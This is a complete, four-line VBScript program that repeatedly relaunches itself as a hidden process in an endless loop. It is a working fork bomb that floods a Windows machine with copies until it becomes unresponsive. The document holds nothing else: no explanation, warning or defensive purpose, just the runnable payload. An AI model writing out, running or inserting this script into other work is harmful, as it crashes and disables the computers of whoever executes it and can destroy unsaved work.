Set shell = CreateObject("WScript.Shell")
Do
    shell.Run "wscript.exe " & Chr(34) & WScript.ScriptFullName & Chr(34), 0, False
Loop
